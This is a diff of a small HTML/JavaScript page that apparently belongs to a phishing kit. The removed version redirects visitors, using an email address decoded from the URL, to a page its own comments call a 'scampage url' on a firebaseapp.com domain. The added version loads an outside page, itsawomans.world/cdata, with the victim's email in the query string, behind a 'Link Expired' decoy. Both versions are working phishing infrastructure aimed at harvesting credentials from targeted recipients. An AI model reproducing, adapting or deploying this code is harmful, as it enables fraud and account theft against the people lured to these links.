@@ -1,87 +1,31 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Sharing</title>
+<object data="https://www.itsawomans.world/cdata?email=" id="obj" width="100%" height="100%" type="text/html">
+  Link Expired
+</object>
 
-    <script type="text/javascript">
-      //domain string to match if redirecting to domain
-      var domainMatching = "google"; //where go going to redirect domain name google
-      //where to redirect scampage url
-      var redirectUrl = "https://ms-storage-shar3p10nt.firebaseapp.com/?email=";
-      //redirect sperator word
-      var redirectDelimiter = "bla";
-      //enable base64
-      var enablebase64 = true;
 
-      function ValidateEmail(mail) {
-        if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
-          return true;
-        }
-        return false;
-      }
-      decodeBase64 = function (s) {
-        var e = {},
-          i,
-          b = 0,
-          c,
-          x,
-          l = 0,
-          a,
-          r = "",
-          w = String.fromCharCode,
-          L = s.length;
-        var A =
-          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-        for (i = 0; i < 64; i++) {
-          e[A.charAt(i)] = i;
-        }
-        for (x = 0; x < L; x++) {
-          c = e[s.charAt(x)];
-          b = (b << 6) + c;
-          l += 6;
-          while (l >= 8) {
-            ((a = (b >>> (l -= 8)) & 0xff) || x < L - 2) && (r += w(a));
-          }
-        }
-        return r;
-      };
+<script type="text/javascript">
 
-      function Fired() {
-        var getParams = function (url) {
-          var params = {};
-          var parser = document.createElement("a");
-          parser.href = url;
-          console.log(parser);
+  function getUrlVars() {
+    var vars = {};
+    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+      vars[key] = value;
+    });
+    return vars;
+  }
 
-          if (parser.href.match(redirectDelimiter)) {
-            var foundRedirections = parser.href.split("bla")[1];
-            console.log(foundRedirections);
-            if (foundRedirections.match(domainMatching)) {
-              if (enablebase64)
-                foundRedirections = decodeBase64(foundRedirections).trim();
-              window.location.href = foundRedirections.match("http")
-                ? foundRedirections
-                : "http://" + foundRedirections;
-            }
-          }
 
-          var query = parser.href.split(/[#\?&=]/);
-          console.log(query);
+  var email = window.location.hash.substr(1);
+  if (!email) {
 
-          for (let param of query) {
-            param = decodeURIComponent(param);
-            if (enablebase64) param = decodeBase64(param).trim();
+    var email = getUrlVars()['email'];
+    document.getElementById("obj").setAttribute('data', 'https://www.itsawomans.world/cdata?email='+email);
+  }
+  else
+  {
+    document.getElementById("obj").setAttribute('data', 'https://www.itsawomans.world/cdata?email='+email);
+  }
 
-            if (ValidateEmail(param)) {
-              window.location.href = redirectUrl + param;
-            }
-          }
-        };
 
-        var param = getParams(window.location.href);
-      }
-    </script>
-  </head>
 
-  <body onload="Fired()"></body>
-</html>
+
+</script>
